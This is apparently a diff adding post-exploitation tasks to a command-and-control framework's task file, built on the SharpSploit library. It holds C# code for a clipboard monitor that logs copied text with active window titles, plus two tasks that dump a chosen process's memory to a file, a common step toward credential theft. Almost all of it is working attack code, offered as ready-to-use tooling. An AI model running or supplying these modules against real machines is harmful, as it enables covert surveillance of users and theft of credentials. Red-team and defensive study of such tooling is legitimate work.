+                                Console.WriteLine(string.Format("[+] Collected: {0:HH:mm:ss.fff}", DateTime.Now));
+                                Console.WriteLine(string.Format("[+] Window Title: {0}", GetActiveWindowTitle()));
+                                Console.WriteLine("[+] Data:");
+                                Console.WriteLine(string.Format("{0}", System.Windows.Forms.Clipboard.GetText()));
+                                Console.WriteLine();
+                            }
+                        } catch {}
+                    });
+
+                    t.SetApartmentState(ApartmentState.STA);
+                    t.Start();
+                    t.Join();
+                }
+                base.WndProc(ref m);
+            }
+        }
+
+        /// <summary>
+        /// Gets the active window title of the window keystrokes are being entered in.
+        /// </summary>
+        /// <author>Scottie Austin (@checkymander)</author>
+        /// <returns>Title of the active window.</returns>
+        private static string GetActiveWindowTitle()
+        {
+            const int capacity = 256;
+            StringBuilder builder = new StringBuilder(capacity);
+            IntPtr handle = GetForegroundWindow();
+
+            if (GetWindowText(handle, builder, capacity) > 0)
+            {
+                return builder.ToString();
+            }
+            return null;
+        }
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern bool AddClipboardFormatListener(IntPtr hwnd);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern int GetWindowText(
+            IntPtr hWnd,
+            StringBuilder text,
+            int count
+        );
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Seconds
+    Value: "0"
+    DefaultValue: "0"
+    Description: Number of seconds the collection task should run for.
+    SuggestedValues: [ "0", "10", "20", "30", "60", "120" ]
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40\System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35\System.Windows.Forms.dll
+      DotNetVersion: Net35
+  EmbeddedResources: []
+- Name: CreateProcessMinidump
+  Aliases:
+  - minidump
+  Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Generates a minidump that represents the memory of a running process. Uses the MiniDumpWriteDump Win32 API call through PInvoke
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Linq;
+
+    using SharpSploit.Enumeration;
+
+    public static class Task
+    {
+        public static string Execute(string Process, string OutputPath, string OutputFileName)
+        {
+            try
+            {
+                if (!Directory.Exists(OutputPath))
+                {
+                    return $"Directory: {OutputPath} does not exist.";
+                }
+                if (int.TryParse(Process, out int ProcID))
+                {
+                    if (Host.CreateProcessDump(ProcID, OutputPath, OutputFileName))
+                    {
+                        return $"Created minidump of process with PID: {ProcID} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                    }
+                    return $"Failed to create minidump of process with PID: {ProcID}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+                }
+                if (Host.CreateProcessDump(Process, OutputPath, OutputFileName))
+                {
+                    return $"Created minidump of process: {Process} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                }
+                return $"Failed to create minidump of process: {Process}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: 'C:\windows\temp\'
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: 'dump.bin'
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: CreateProcessSnapshotDump
+  Aliases:
+  - snapshotdump
+  Author:
+    Name: Simone Salucci & Daniel López @ NCC Group
+    Handle: '@saim1z @attl4s'
+    Link: ''
+  Description: Creates a snapshot of the targeted process using PssCaptureSnapshot (Windows 8.1+ and Windows Server 2012+) and dumps it using MiniDumpWriteDump. The snapshot is cleaned after the dump.
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using System.Linq;
+
+    using SharpSploit.Enumeration;
+
+    public static class Task
+    {
+        public static string Execute(string Process, string OutputPath, string OutputFileName)
+        {
+            try
+            {
+                if (!Directory.Exists(OutputPath))
+                {
+                    return $"Directory: {OutputPath} does not exist.";
+                }
+                if (int.TryParse(Process, out int ProcID))
+                {
+                    if (Host.CreateProcessSnapshotDump(ProcID, OutputPath, OutputFileName))
+                    {
+                        return $"Created snapshot minidump of process with PID: {ProcID} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                    }
+                    return $"Failed to create snapshot minidump of process with PID: {ProcID}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+                }
+                if (Host.CreateProcessSnapshotDump(Process, OutputPath, OutputFileName))
+                {
+                    return $"Created snapshot minidump of process: {Process} located at: {Path.Combine(OutputPath, OutputFileName)}";
+                }
+                return $"Failed to create snapshot minidump of process: {Process}. {Path.Combine(OutputPath, OutputFileName)} has been deleted.";
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Process
+    Value: ''
+    DefaultValue: ''
+    Description: Process name or PID
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputPath
+    Value: ''
+    DefaultValue: 'C:\windows\temp\'
+    Description: Path where the dump will be stored (e.g. C:\windows\temp\)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  - Name: OutputFileName
+    Value: ''
+    DefaultValue: 'dump.bin'
+    Description: Name used for the dump (e.g. dump.bin)
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
     EmbeddedResources: []
   ReferenceAssemblies: []
   EmbeddedResources: []
